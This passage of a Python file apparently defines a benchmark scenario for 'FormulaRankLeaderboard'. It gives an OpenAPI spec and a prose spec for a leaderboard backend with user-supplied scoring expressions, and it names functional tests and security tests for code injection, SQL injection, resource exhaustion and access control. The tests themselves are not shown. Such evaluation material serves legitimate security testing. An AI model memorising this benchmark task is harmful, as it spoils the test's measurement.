          description: Invalid expression or input
        '403':
          description: Missing or invalid management token
        '404':
          description: Leaderboard not found
        '422':
          description: Malformed request
  /leaderboards/{leaderboardId}/rankings:
    get:
      summary: Fetch the leaderboard ranked by computed score
      parameters:
        - $ref: '#/components/parameters/LeaderboardId'
      responses:
        '200':
          description: Rankings sorted by computed score (descending)
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/RankingEntry'
        '400':
          description: Invalid request
        '404':
          description: Leaderboard not found
        '409':
          description: Scoring formula not defined
        '422':
          description: Malformed request
components:
  parameters:
    LeaderboardId:
      in: path
      name: leaderboardId
      required: true
      schema:
        type: string
      description: Identifier of the leaderboard
    ManagementToken:
      in: header
      name: X-Management-Token
      required: true
      schema:
        type: string
      description: Management token returned on leaderboard creation
  schemas:
    Competitor:
      type: object
      properties:
        competitorId:
          type: string
          description: Unique identifier for the competitor within the leaderboard
          example: "driver_44"
        displayName:
          type: string
          description: Optional display name
          example: "Lewis Hamilton"
        stats:
          type: object
          additionalProperties:
            type: number
            format: float
          description: Map of stat name to numeric value (e.g., "wins", "podiums")
          example:
            wins: 11
            poles: 7
            fastest_laps: 5
      required:
        - competitorId
        - stats
    CreateLeaderboardRequest:
      type: object
      properties:
        name:
          type: string
          description: Optional human-readable name for the leaderboard
          example: "2025 Season"
        competitors:
          type: array
          items:
            $ref: '#/components/schemas/Competitor'
      required:
        - competitors
    CreateLeaderboardResponse:
      type: object
      properties:
        leaderboardId:
          type: string
          example: "lb_01JABCDXYZ"
        managementToken:
          type: string
          description: Token required to update the scoring formula for this leaderboard
          example: "mt_9f1a2b3c4d5e6f"
        formulaDefined:
          type: boolean
          description: Whether a scoring formula is currently defined
          example: false
      required:
        - leaderboardId
        - managementToken
        - formulaDefined
    UpdateFormulaRequest:
      type: object
      properties:
        expression:
          type: string
          description: >
            Scoring expression referencing stats by name. Supports + - * / % and parentheses,
            and deterministic functions: abs(x), min(a,b), max(a,b), floor(x), ceil(x), round(x), sqrt(x).
            Example: "2*wins + 3*poles + max(0, bonus) - 0.5*penalties"
          example: "2*wins + 3*poles + max(0, bonus) - 0.5*penalties"
      required:
        - expression
    RankingEntry:
      type: object
      properties:
        rank:
          type: integer
          minimum: 1
          example: 1
        competitorId:
          type: string
          example: "driver_33"
        displayName:
          type: string
          example: "Max Verstappen"
        computedScore:
          type: number
          format: float
          example: 87.5
      required:
        - rank
        - competitorId
        - computedScore
"""

_TEXT_SPEC = """
FormulaRankLeaderboard is a backend for creating leaderboards with competitors and numeric stats, defining a scoring expression that computes each competitor’s score from those stats, and retrieving the leaderboard sorted by computed score (descending). Each leaderboard returns a management token at creation, required to set or update its scoring formula.

1) Create a leaderboard
- Endpoint: POST /leaderboards
- Purpose: Create a new leaderboard with an initial set of competitors and their stats.
- Request body (application/json):
  - name (string, optional): Human-readable leaderboard name.
  - competitors (array, required): Each item is a Competitor object:
    - competitorId (string, required): Unique within the leaderboard.
    - displayName (string, optional).
    - stats (object, required): Map of statName -> number (float). Example keys: wins, poles, fastest_laps.
- Responses:
  - 201: { leaderboardId (string), managementToken (string), formulaDefined (boolean) }
  - 400: Invalid input
  - 422: Malformed request

2) Define or update the scoring formula
- Endpoint: PUT /leaderboards/{leaderboardId}/formula
- Purpose: Set or update the scoring expression used to compute scores for all competitors in the specified leaderboard.
- Parameters:
  - Path: leaderboardId (string, required)
  - Header: X-Management-Token (string, required) — the management token returned at creation
- Request body (application/json):
  - expression (string, required): References stats by name (matching keys in competitors’ stats). Supports +, -, *, /, %, parentheses, and deterministic functions: abs(x), min(a,b), max(a,b), floor(x), ceil(x), round(x), sqrt(x). Example: "2*wins + 3*poles + max(0, bonus) - 0.5*penalties"
- Responses:
  - 200: Scoring formula updated
  - 400: Invalid expression or input
  - 403: Missing or invalid management token
  - 404: Leaderboard not found
  - 422: Malformed request

3) Fetch rankings
- Endpoint: GET /leaderboards/{leaderboardId}/rankings
- Purpose: Return competitors ranked by computed score in descending order, using the currently defined formula.
- Parameters:
  - Path: leaderboardId (string, required)
- Response 200 (application/json): Array of RankingEntry objects:
  - rank (integer, >=1)
  - competitorId (string)
  - displayName (string, optional)
  - computedScore (number, float)
- Error responses:
  - 400: Invalid request
  - 404: Leaderboard not found
  - 409: Scoring formula not defined
  - 422: Malformed request
"""

from scenarios.base import Scenario

SCENARIO = Scenario(
    id="""FormulaRankLeaderboard""",
    api_spec=_API_SPEC,
    text_spec=_TEXT_SPEC,
    short_app_description="""A backend that lets a client create a leaderboard with a set of competitors and their numeric stats, later define a math expression that computes each competitor’s score from those stats, and then fetch the leaderboard sorted by the computed score. On creation, the service returns a management token tied to that leaderboard, which is required to update the scoring formula. The expression supports basic arithmetic and a small set of deterministic functions, referencing stats by name, and the ranking output includes the final computed score per competitor.""",
    needs_db=True,
    needs_secret=False,
    scenario_instructions="""""",
    functional_tests=[
        func_test_create_set_formula_and_fetch_rankings_basic_arithmetic,
        func_test_formula_with_functions_max_and_ordering,
        func_test_updating_formula_reorders_leaderboard,
    ],
    security_tests=[
        sec_test_code_injection,
        sec_test_sql_injection,
        sec_test_uncontrolled_resource_consumption,
        sec_test_improper_access_control,
    ],
)
